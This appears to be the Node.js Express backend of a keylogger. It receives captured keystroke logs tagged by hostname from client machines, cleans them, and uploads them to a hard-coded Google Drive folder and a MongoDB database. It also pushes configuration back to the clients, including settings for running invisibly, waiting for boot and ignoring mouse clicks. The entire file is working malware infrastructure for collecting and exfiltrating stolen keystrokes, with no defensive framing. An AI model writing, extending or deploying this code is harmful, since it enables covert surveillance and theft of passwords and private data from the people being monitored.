import express from "express";
import dayjs from "dayjs";
import cors from 'cors'
import dotenv from "dotenv";
import GoogleDriveService from "./util/googleDrive.js";
import BatchProcessor from "./util/batchProcessor.js";
import {processKeyloggerData} from "./util/cleanRawLogs.js";
import connectDB from "./util/database.js";
import userRoutes from './router/userRoutes.js';

dotenv.config({});

const app = express();

const configValues = {
        format : 0, // 0 = labels, 10 = decimal, 16 = hex
        visible :  true, // true = VISIBLE, false = INVISIBLE
        boot_wait : true, // true = BOOT_WAIT, false = NOWAIT
        mouse_ignore : true, // true = ignore mouse clicks
        serverName : "localhost",
        resource : "/",
        intervalMinutes : 2,  // Minutes
        log_file_name : "keylogger.log",
        backend_port : 8000,
}

export const root_folder = "1c-6HpFy91j6GWOwNrMON7BW0pHv7evFM"; 

// The Google Drive service is initialized inside this batchProcessor's constructor automatically
const batchProcessor = new BatchProcessor();

// Middleware with increased body size limit
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// allow all origins
app.use(cors());

// check backend working
app.get("/", (req, res) => {
    return res.status(200).json({
        message: "I am coming from backend",
        success: true
    });
});

app.post("/", async (req, res) => {
    console.log(`request to save logs came`)
    const { logs, hostname } = req.body;
    console.log(`request to save logs came by ${hostname} with ${logs.length} logs`)
    
    if (!Array.isArray(logs) || !hostname) {
        return res.status(400).json({ success: false, message: "Missing logs array or hostname" });
    }
    
    try {
        // Preprocess logs before batch processing
        const processedLogs = processKeyloggerData(logs);
        // Always use batch processing for consistency and reliability
        const result = await batchProcessor.processLargeDataset(hostname, processedLogs);
        
        res.send({ 
            success: true, 
            message: "Logs processed successfully", 
            result: result, 
            config: configValues,
        });
    } catch (err) {
        console.error('Error processing logs:', err);
        res.status(500).json({ 
            success: false, 
            message: "Server error",
            config: configValues,
        });
    }
});

app.use('/api/users', userRoutes);

// Start the server
const PORT = process.env.PORT || 8000;
app.listen(PORT, async () => {
    try {
        // connect to mongoDB
        await connectDB();
        // Server UP and running smooth
        console.log(`Server running at port ${PORT}`);
    } catch (err) {
        console.error('Failed to start server:', err);
        process.exit(1);
    }    
});